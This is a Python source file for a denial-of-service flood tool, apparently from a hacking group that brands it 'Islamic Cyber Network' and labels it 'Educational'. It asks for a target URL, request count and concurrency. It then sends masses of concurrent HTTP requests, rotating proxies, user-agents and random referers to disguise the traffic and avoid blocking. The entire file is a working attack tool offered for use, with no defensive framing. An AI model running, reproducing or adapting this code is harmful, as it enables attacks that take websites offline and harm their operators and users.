import os
import asyncio
import aiohttp
import random
import string
import time
from colorama import Fore, init

init(autoreset=True)
os.system('clear')

# ইউনিক ASCII লোগো
print(Fore.CYAN + '''
╔══════════════════════════════════════════════╗
║        ███████╗ █████╗ ██████╗ ██╗           ║
║        ██╔════╝██╔══██╗██╔══██╗██║           ║
║        █████╗  ███████║██████╔╝██║           ║
║        ██╔══╝  ██╔══██║██╔═══╝ ██║           ║
║        ██║     ██║  ██║██║     ███████╗      ║
║        ╚═╝     ╚═╝  ╚═╝╚═╝     ╚══════╝      ║
╠══════════════════════════════════════════════╣
║   FarHad–CrypteX  |  Islamic Cyber Network   ║
║   Advanced Async Flood Tool (Educational)    ║
╚══════════════════════════════════════════════╝
''')

url = input(Fore.GREEN + "Enter Target URL: ").strip()
total_requests = int(input(Fore.GREEN + "Enter total requests (e.g. 10000): "))
concurrency = int(input(Fore.GREEN + "Enter concurrency (e.g. 100): "))

# Optional Proxy
use_proxy = input(Fore.YELLOW + "Use proxy? (y/n): ").lower() == "y"
proxy_list = []
if use_proxy:
    file_name = input("Enter proxy file (ip:port per line): ")
    try:
        with open(file_name) as f:
            proxy_list = [line.strip() for line in f if line.strip()]
    except:
        print(Fore.RED + "[!] Proxy file error.")
        proxy_list = []

# User-Agent Pool
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
]

success = 0
failed = 0
lock = asyncio.Lock()
start_time = time.time()

def randstr(n=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

async def attack(session, sem):
    global success, failed
    async with sem:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Referer": f"https://google.com/{randstr(5)}"
            }
            proxy = random.choice(proxy_list) if proxy_list else None
            async with session.get(url, headers=headers, proxy=f"http://{proxy}" if proxy else None, timeout=5) as r:
                async with lock:
                    success += 1
                    print(Fore.GREEN + f"[+] {r.status} OK")
        except:
            async with lock:
                failed += 1
                print(Fore.RED + "[-] Failed")

async def show_stats():
    while True:
        await asyncio.sleep(5)
        uptime = int(time.time() - start_time)
        print(Fore.MAGENTA + f"[STATS] Sent: {success} | Failed: {failed} | Uptime: {uptime}s")

async def main():
    sem = asyncio.Semaphore(concurrency)
    conn = aiohttp.TCPConnector(ssl=False, limit=0)
    async with aiohttp.ClientSession(connector=conn) as session:
        asyncio.create_task(show_stats())
        tasks = [attack(session, sem) for _ in range(total_requests)]
        await asyncio.gather(*tasks)

try:
    asyncio.run(main())
except KeyboardInterrupt:
    print(Fore.RED + "\n[!] Interrupted by user.")